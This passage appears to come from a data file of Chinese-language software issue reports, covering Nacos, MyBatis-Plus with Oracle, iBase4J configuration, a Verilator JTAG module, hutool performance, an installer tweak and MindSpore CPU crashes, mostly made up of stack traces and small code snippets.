org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1204) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:557) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:517) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:323) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:321) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:879) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:878) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:550) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:141) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:747) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:397) at org.springframework.boot.SpringApplication.run(SpringApplication.java:315) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1226) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1215) at com.alibaba.nacos.EhrNacosApplication.main(EhrNacosApplication.java:22) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.boot.loader.MainMethodRunner.run(MainMethodRunner.java:48) at org.springframework.boot.loader.Launcher.launch(Launcher.java:87) at org.springframework.boot.loader.Launcher.launch(Launcher.java:51) at org.springframework.boot.loader.JarLauncher.main(JarLauncher.java:52) Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dumpService': Invocation of init method failed; nested exception is java.lang.RuntimeException: Nacos Server did not start because dumpservice bean construction failure : No DataSource set at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:160) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyBeanPostProcessorsBeforeInitialization(AbstractAutowireCapableBeanFactory.java:416) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1788) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:595) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:517) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:323) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:321) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1287) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1207) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:885) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:789) ... 27 common frames omitted Caused by: java.lang.RuntimeException: Nacos Server did not start because dumpservice bean construction failure : No DataSource set at com.alibaba.nacos.config.server.service.dump.DumpService.init(DumpService.java:140) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleElement.invoke(InitDestroyAnnotationBeanPostProcessor.java:389) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleMetadata.invokeInitMethods(InitDestroyAnnotationBeanPostProcessor.java:333) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:157) ... 40 common frames omitted   <code>: ,--. ,--.'| --.' ./ Console: http://10.42.1.27:8848/nacos/index.html ' ' ;. ;.--. .-. | / / '' | |: :| : ;_ | | | \ | \__\/: . .. ' / ' | .; : \ \ ----. \ | | ' --' / ' : | ; : .' \ : : --'---' '---' ---'"
枚举,"当前使用版本 mp3.4.3.1 最新的这个 oracle11g 驱动ojdbc6 11.2.0.3 druid1.2.1-1.2.6（都试了） 枚举查询结果映射抛出移除   <code>: rg.springframework.beans.factory.BeanCreationException: Error creating bean with name 'paramFactory' defined in class path resource [com/xxx/ParamConfig.class]: Invocation of init method failed; nested exception is org.springframework.jdbc.UncategorizedSQLException: Error attempting to get column 'STATUS' from result set. Cause: java.sql.SQLException: Error ; uncategorized SQLException; SQL state [null]; error code [0]; Error; nested exception is java.sql.SQLException: Error at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1778) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:593) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:515) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:320) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:318) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:204) at org.springframework.context.support.PostProcessorRegistrationDelegate.registerBeanPostProcessors(PostProcessorRegistrationDelegate.java:240) at org.springframework.context.support.AbstractApplicationContext.registerBeanPostProcessors(AbstractApplicationContext.java:721) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:534) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:141) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:743) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:390) at org.springframework.boot.SpringApplication.run(SpringApplication.java:312) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1214) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1203) at com.xxx.App.main(App.java:33) Caused by: org.springframework.jdbc.UncategorizedSQLException: Error attempting to get column 'STATUS' from result set. Cause: java.sql.SQLException: Error ; uncategorized SQLException; SQL state [null]; error code [0]; Error; nested exception is java.sql.SQLException: Error at org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:89) at org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:81) at org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:81) at org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:91) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:441) at com.sun.proxy.$Proxy115.selectList(Unknown Source) at org.mybatis.spring.SqlSessionTemplate.selectList(SqlSessionTemplate.java:224) at com.baomidou.mybatisplus.core.override.MybatisMapperMethod.executeForMany(MybatisMapperMethod.java:166) at com.baomidou.mybatisplus.core.override.MybatisMapperMethod.execute(MybatisMapperMethod.java:77) at com.baomidou.mybatisplus.core.override.MybatisMapperProxy$PlainMethodInvoker.invoke(MybatisMapperProxy.java:148) at com.baomidou.mybatisplus.core.override.MybatisMapperProxy.invoke(MybatisMapperProxy.java:89) at com.sun.proxy.$Proxy116.startParamFullList(Unknown Source) at com.xxx.ParamServiceImpl.startParamFullList(ParamServiceImpl.java:41) at com.xxx.ParamServiceImpl$$FastClassBySpringCGLIB$$c56b1ec.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:684) at com.xxx.ParamServiceImpl$$EnhancerBySpringCGLIB$$2dae2d56.startParamFullList(&lt;generated&gt;) at com.xxx.afterPropertiesSet(ParamFactory.java:41) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1837) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1774) ... 16 common frames omitted Caused by: java.sql.SQLException: Error at com.alibaba.druid.pool.DruidDataSource.handleConnectionException(DruidDataSource.java:1774) at com.alibaba.druid.pool.DruidPooledConnection.handleException(DruidPooledConnection.java:134) at com.alibaba.druid.pool.DruidPooledStatement.checkException(DruidPooledStatement.java:81) at com.alibaba.druid.pool.DruidPooledResultSet.checkException(DruidPooledResultSet.java:54) at com.alibaba.druid.pool.DruidPooledResultSet.getObject(DruidPooledResultSet.java:1779) at com.baomidou.mybatisplus.core.handlers.MybatisEnumTypeHandler.getNullableResult(MybatisEnumTypeHandler.java:118) at com.baomidou.mybatisplus.core.handlers.MybatisEnumTypeHandler.getNullableResult(MybatisEnumTypeHandler.java:49) at org.apache.ibatis.type.BaseTypeHandler.getResult(BaseTypeHandler.java:85) at org.apache.ibatis.executor.resultset.DefaultResultSetHandler.getPropertyMappingValue(DefaultResultSetHandler.java:512) at org.apache.ibatis.executor.resultset.DefaultResultSetHandler.applyPropertyMappings(DefaultResultSetHandler.java:481) at org.apache.ibatis.executor.resultset.DefaultResultSetHandler.getRowValue(DefaultResultSetHandler.java:405) at org.apache.ibatis.executor.resultset.DefaultResultSetHandler.handleRowValuesForSimpleResultMap(DefaultResultSetHandler.java:355) at org.apache.ibatis.executor.resultset.DefaultResultSetHandler.handleRowValues(DefaultResultSetHandler.java:329) at org.apache.ibatis.executor.resultset.DefaultResultSetHandler.handleResultSet(DefaultResultSetHandler.java:302) at org.apache.ibatis.executor.resultset.DefaultResultSetHandler.handleResultSets(DefaultResultSetHandler.java:195) at org.apache.ibatis.executor.statement.PreparedStatementHandler.query(PreparedStatementHandler.java:65) at org.apache.ibatis.executor.statement.RoutingStatementHandler.query(RoutingStatementHandler.java:79) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:64) at com.sun.proxy.$Proxy121.query(Unknown Source) at org.apache.ibatis.executor.SimpleExecutor.doQuery(SimpleExecutor.java:63) at org.apache.ibatis.executor.BaseExecutor.queryFromDatabase(BaseExecutor.java:325) at org.apache.ibatis.executor.BaseExecutor.query(BaseExecutor.java:156) at org.apache.ibatis.executor.CachingExecutor.query(CachingExecutor.java:109) at com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor.intercept(MybatisPlusInterceptor.java:81) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:62) at com.sun.proxy.$Proxy120.query(Unknown Source) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:151) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:145) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:140) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:427) ... 31 common frames omitted Caused by: java.lang.AbstractMethodError: Method oracle/jdbc/driver/OracleResultSetImpl.getObject(Ljava/lang/String;Ljava/lang/Class;)Ljava/lang/Object; is abstract at oracle.jdbc.driver.OracleResultSetImpl.getObject(OracleResultSetImpl.java) at com.p6spy.engine.wrapper.ResultSetWrapper.getObject(ResultSetWrapper.java:1649) at com.alibaba.druid.pool.DruidPooledResultSet.getObject(DruidPooledResultSet.java:1777) ... 64 common frames omitted Disconnected from the target VM, address: '127.0.0.1:53687', transport: 'socket' Process finished with exit code 137 (interrupted by signal 9: SIGKILL)"
iBase4J-Common中mybatis.xml中如何配置多个包路径,"在mybatis.xml文件中，typeAliasesPackage 和 basePackage 都可以实现多个包路径的配置，但是通配符和逗号只能选择一个使用。 但是我的项目中的代码是在iBase4J-Biz-XXX中，父级包是com.well，实体包是com.well.xxx.model，代理包是com.well.xxx.mapper， 而iBase4J项目中的代码是在iBase4J-SYS-XXX中，父级包为org.ibase4j，实体包是org.ibase4j.model，代理包是org.ibase4j.mapper。 使用如下配置 是报错的，debug一下代码，不支持同时解析通配符和逗号，想问一下这个问题是如何解决？ 是否可以不用iBase4J-Common中的mybatis.xml，而是在iBase4J-SYS-Service和iBase4J-Biz-Service中分别配置一个mybatis.xml。   <code>: &lt;property name=""typeAliasesPackage"" value=""org.ibase4j.model,com.bdjsi.**.model"" /&gt; &lt;property name=""basePackage"" value=""org.ibase4j.mapper,com.bdjsi.**.mapper"" /&gt;"
针对verilator分支jtag_dtm下，dtmcs_abits位宽的问题,根据riscv debug 0.13手册，dtmcs的abits应该有6位宽，指dmi的adress位数7位，那abits应该等于7，即6'h7才对 应该改成   <code>: jtag_dtm.v: wire[DMI_ADDR_BITS-1:0] abits = DMI_ADDR_BITS[6:0]; wire[5:0] abits = DMI_ADDR_BITS[5:0];
BeanUtil.getProperty 执行速度巨慢,"JDK版本： java version ""1.8.0_281"" hutool版本： 5.6.7 执行结果   <code>: @org.junit.Test public void test() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException { Entity entity = new Entity(); entity.setA(""1111""); Long count = 10000000L; long start = System.currentTimeMillis(); for (int i = 0; i &lt; count; i++) { String a = entity.getA(); // System.out.println(a); } long end = System.currentTimeMillis(); System.out.println(""get method "" + (end - start)); start = System.currentTimeMillis(); Method getA = Entity.class.getMethod(""getA"", null); for (int i = 0; i &lt; count; i++) { Object invoke = getA.invoke(entity, null); //System.out.println(invoke); } end = System.currentTimeMillis(); System.out.println(""invoke time "" + (end - start)); start = System.currentTimeMillis(); for (int i = 0; i &lt; count; i++) { Object getA1 = BeanUtil.getProperty(entity, ""a""); //System.out.println(getA1); } end = System.currentTimeMillis(); System.out.println(""hutool time "" + (end - start)); } get method 27 invoke time 47 hutool time 3044"
安装进程可以去除对应用中心的依赖,"举个例子 install.php的485行可以删除 486行可图把“align = right”改成""align = center""   <code>: /* 去除对应用中心的依赖 */ echo '&lt;p align=""center""&gt;&lt;a href=""'.$default_appurl.'""&gt;'.$lang['install_finish'].'&lt;/a&gt;&lt;/p&gt;&lt;br /&gt;';"
[CT][MS] cases  core dump  at cpu backend ,": Uncomment only one line, hit enter to put that in a new line, and remove leading whitespaces from that line: /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : pytest -s -v operations/test_avgpool.py::test_avgpool_input_32x64x112x112_ksize_3_stride_2_padding_same pytest -s -v operations/test_avgpool2d.py::test_avgpool2d_input_32x64x112x112_ksize_3_stride_2_padding_same pytest -s -v operations/test_batchnorm3d.py::test_batchnorm3d_input_1x3x4x27x27_fp32 pytest -s -v operations/test_maxpool2d.py::test_maxpool_input_32x64x112x112_dtype_fp16 pytest -s -v operations/test_rmsprop.py::test_rmsprop_forward_input_shape_4d_epoch_3_lr_0001_centered_true_dtype_float32 pytest -s -v operations/test_tanh.py::test_tanh_input_0 pytest -s -v side_effect_expression/test_side_effect_expression02.py::test_side_effect_grad_two_addn_switch pytest -s -v parse/test_parser_tuple_index.py::test_parser_tuple_minus_index_004 cpu + master + graph/pynative +python3.7 pytest -s -v operations/test_avgpool.py::test_avgpool_input_32x64x112x112_ksize_3_stride_2_padding_same pytest -s -v operations/test_avgpool2d.py::test_avgpool2d_input_32x64x112x112_ksize_3_stride_2_padding_same <ol start=""3""> pytest -s -v operations/test_batchnorm3d.py::test_batchnorm3d_input_1x3x4x27x27_fp32 <ol start=""4""> pytest -s -v operations/test_maxpool2d.py::test_maxpool_input_32x64x112x112_dtype_fp16 <ol start=""5""> pytest -s -v operations/test_rmsprop.py::test_rmsprop_forward_input_shape_4d_epoch_3_lr_0001_centered_true_dtype_float32 <ol start=""6""> pytest -s -v operations/test_tanh.py::test_tanh_input_0 7.pytest -s -v side_effect_expression/test_side_effect_expression02.py::test_side_effect_grad_two_addn_switch <ol start=""8""> pytest -s -v parse/test_parser_tuple_index.py::test_parser_tuple_minus_index_004 <ol start=""9""> pytest -s -v checkpoint/test_checkpoint_specified.py::test_checkpoint_config_saved_network_none <ol start=""10""> pytest -s -v checkpoint/test_checkpoint_resnet50_train.py::test_resnet50_train_image_checkpoint_check_loss_value[True]   <code>: INFO] DEVICE(17604,7f09f4c36700,python):2021-07-08-17:29:58.036.857 [mindspore/ccsrc/runtime/hardware/cpu/cpu_memory_pool.cc:75] AllocDeviceMem] Current alloc size[1073741824], total used size[1073741824]. Fatal Python error: Segmentation fault Thread 0x00007f0bb4602740 (most recent call first): Segmentation fault (core dumped) [INFO] VM(62337,7fc03eee4740,python):2021-07-08-17:32:03.564.425 [mindspore/ccsrc/vm/backend.cc:830] RunGraph] Run actor end, actor name: kernel_graph_0 double free or corruption (out) Fatal Python error: Aborted Current thread 0x00007fc03eee4740 (most recent call first): File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 643 in del_net_res File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 293 in __del__ File ""/home/wangchunai/code0707/MindSporeTest/share/ops/nn/avgpool2d_ops.py"", line 93 in forward_cmp File ""/home/wangchunai/code0707/MindSporeTest/operations/test_avgpool2d.py"", line 515 in test_avgpool2d_input_32x64x112x112_ksize_3_stride_2_padding_same File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/python.py"", line 167 in pytest_pyfunc_call File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/python.py"", line 1445 in runtest File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 134 in pytest_runtest_call File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 237 in from_call File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in call_runtest_hook File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 185 in call_and_report File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 99 in runtestprotocol File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 84 in pytest_runtest_protocol File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/main.py"", line 271 in pytest_runtestloop File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/main.py"", line 247 in _main File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/main.py"", line 197 in wrap_session File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/main.py"", line 240 in pytest_cmdline_main File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/config/__init__.py"", line 93 in main File ""/root/miniconda3/envs/ci3.7/bin/pytest"", line 8 in &lt;module&gt; Aborted (core dumped) [INFO] VM(38173,7f63860c6740,python):2021-07-08-17:27:35.727.008 [mindspore/ccsrc/vm/backend.cc:830] RunGraph] Run actor end, actor name: kernel_graph_1 corrupted double-linked list Fatal Python error: Aborted Current thread 0x00007f63860c6740 (most recent call first): File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/context.py"", line 734 in get_context File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 290 in __del__ File ""/home/wangchunai/code0707/MindSporeTest/share/ops/nn/batchnorm3d_ops.py"", line 223 in grad_cmp File ""/home/wangchunai/code0707/MindSporeTest/operations/test_batchnorm3d.py"", line 30 in test_batchnorm3d_input_1x3x4x27x27_fp32 File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/python.py"", line 167 in pytest_pyfunc_call File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/python.py"", line 1445 in runtest File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 134 in pytest_runtest_call File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 237 in from_call File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in call_runtest_hook File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 185 in call_and_report File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 99 in runtestprotocol File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 84 in pytest_runtest_protocol File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/main.py"", line 271 in pytest_runtestloop File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/main.py"", line 247 in _main File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/main.py"", line 197 in wrap_session File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/main.py"", line 240 in pytest_cmdline_main File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/_pytest/config/__init__.py"", line 93 in main File ""/root/miniconda3/envs/ci3.7/bin/pytest"", line 8 in &lt;module&gt; Aborted (core dumped) [INFO] ME(61093,7fbd0f14b740,python):2021-07-08-17:33:38.018.572 [mindspore/core/mindrt/src/actor/actormgr.cc:113] Finalize] mindrt IOMGRS finish exiting. [INFO] DEVICE(61093,7fbd0f14b740,python):2021-07-08-17:33:38.030.693 [mindspore/ccsrc/runtime/hardware/device_context_manager.cc:29] ClearDeviceContexts] Release device CPU_0 double free or corruption (out) Fatal Python error: Aborted Current thread 0x00007fbd0f14b740 (most recent call first): Aborted (core dumped) [INFO] PARSER(2206,7fe3daadc740,python):2021-07-08-17:35:50.274.121 [mindspore/ccsrc/pipeline/jit/parse/function_block.cc:475] AttachIsolatedNodesBeforeReturn] Attached for side-effect nodes, depend_node: construct.102:[CNode]108{[0]: ValueNode&lt;Primitive&gt; Depend, [1]: [CNode]109, [2]: [CNode]110}, state: construct.102:[CNode]103{[0]: construct.102:[CNode]104{[0]: ValueNode&lt;Primitive&gt; resolve, [1]: ValueNode&lt;NameSpace&gt; SymbolStr, [2]: ValueNode&lt;Symbol&gt; _shape_check_bn}, [1]: construct.102:[CNode]105{[0]: [CNode]106, [1]: Φx}, [2]: construct.102:[CNode]107{[0]: ValueNode&lt;Primitive&gt; resolve, [1]: ValueNode&lt;NameSpace&gt; ClassMember, [2]: ValueNode&lt;Symbol&gt; input_dims}} python: malloc.c:3857: _int_malloc: Assertion `chunk_main_arena (fwd)' failed. Fatal Python error: Aborted Current thread 0x00007fe3daadc740 (most recent call first): File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 531 in compile File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 630 in compile File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 643 in compile_and_run File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 385 in __call__ File ""/home/wangchunai/code0707/MindSporeTest/share/ops/nn/rmsprop_ops.py"", line 89 in forward_mindspore_impl File ""/home/wangchunai/code0707/MindSporeTest/share/ops/nn/rmsprop_ops.py"", line 124 in forward_cmp File ""/home/wangchunai/code0707/MindSporeTest/operations/test_rmsprop.py"", line 79 in 